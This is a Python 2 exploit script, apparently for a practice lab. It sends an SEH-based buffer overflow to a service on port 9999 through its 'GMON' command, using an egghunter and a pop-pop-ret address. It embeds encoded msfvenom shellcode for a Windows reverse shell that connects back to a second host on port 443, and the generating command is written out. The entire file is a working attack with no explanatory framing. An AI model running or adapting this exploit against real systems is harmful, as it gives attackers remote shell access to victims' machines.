#!/usr/bin/python

import sys, socket

ip = "192.168.82.128"
port = 9999

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	print "[*] Connection successful"
except:
	print "[!] Connection failed.  Exiting..."
	sys.exit(1)

# Payload size: 351 bytes
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.82.129 LPORT=443 --arch x86 --platform windows -f c -e x86/shikata_ga_nai -b "\x00"
shellcode = ("T00WT00W" + "\x90" * 16 + 
"\xdb\xcd\xba\x83\x45\x62\xee\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x50\x17\x83\xc0\x04\x03\xd3\x56\x80\x1b\x2f\xb0\xc6"
"\xe4\xcf\x41\xa7\x6d\x2a\x70\xe7\x0a\x3f\x23\xd7\x59\x6d\xc8"
"\x9c\x0c\x85\x5b\xd0\x98\xaa\xec\x5f\xff\x85\xed\xcc\xc3\x84"
"\x6d\x0f\x10\x66\x4f\xc0\x65\x67\x88\x3d\x87\x35\x41\x49\x3a"
"\xa9\xe6\x07\x87\x42\xb4\x86\x8f\xb7\x0d\xa8\xbe\x66\x05\xf3"
"\x60\x89\xca\x8f\x28\x91\x0f\xb5\xe3\x2a\xfb\x41\xf2\xfa\x35"
"\xa9\x59\xc3\xf9\x58\xa3\x04\x3d\x83\xd6\x7c\x3d\x3e\xe1\xbb"
"\x3f\xe4\x64\x5f\xe7\x6f\xde\xbb\x19\xa3\xb9\x48\x15\x08\xcd"
"\x16\x3a\x8f\x02\x2d\x46\x04\xa5\xe1\xce\x5e\x82\x25\x8a\x05"
"\xab\x7c\x76\xeb\xd4\x9e\xd9\x54\x71\xd5\xf4\x81\x08\xb4\x90"
"\x66\x21\x46\x61\xe1\x32\x35\x53\xae\xe8\xd1\xdf\x27\x37\x26"
"\x1f\x12\x8f\xb8\xde\x9d\xf0\x91\x24\xc9\xa0\x89\x8d\x72\x2b"
"\x49\x31\xa7\xfc\x19\x9d\x18\xbd\xc9\x5d\xc9\x55\x03\x52\x36"
"\x45\x2c\xb8\x5f\xec\xd7\x2b\xa0\x59\x85\x2a\x48\x98\x29\x2c"
"\x32\x15\xcf\x44\x54\x70\x58\xf1\xcd\xd9\x12\x60\x11\xf4\x5f"
"\xa2\x99\xfb\xa0\x6d\x6a\x71\xb2\x1a\x9a\xcc\xe8\x8d\xa5\xfa"
"\x84\x52\x37\x61\x54\x1c\x24\x3e\x03\x49\x9a\x37\xc1\x67\x85"
"\xe1\xf7\x75\x53\xc9\xb3\xa1\xa0\xd4\x3a\x27\x9c\xf2\x2c\xf1"
"\x1d\xbf\x18\xad\x4b\x69\xf6\x0b\x22\xdb\xa0\xc5\x99\xb5\x24"
"\x93\xd1\x05\x32\x9c\x3f\xf0\xda\x2d\x96\x45\xe5\x82\x7e\x42"
"\x9e\xfe\x1e\xad\x75\xbb\x2f\xe4\xd7\xea\xa7\xa1\x82\xae\xa5"
"\x51\x79\xec\xd3\xd1\x8b\x8d\x27\xc9\xfe\x88\x6c\x4d\x13\xe1"
"\xfd\x38\x13\x56\xfd\x68")

# Egg: W00TW00T
egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# Buffer size: 5005
# [*] Exact match at offset 3519
# PPR address: 625010B4

evil = shellcode + "\x41" * (3515 - len(shellcode)) + "\xeb\x08\x90\x90" + "\xB4\x10\x50\x62" + "\x90" * 8 + egghunter + "\x43" * (5005 - 3515 - 4 - 8 - len(egghunter))

buffer = "GMON /.:/" + evil + "\r\n"

s.recv(1024)
s.send(buffer)
s.close()
print "[*] Payload sent"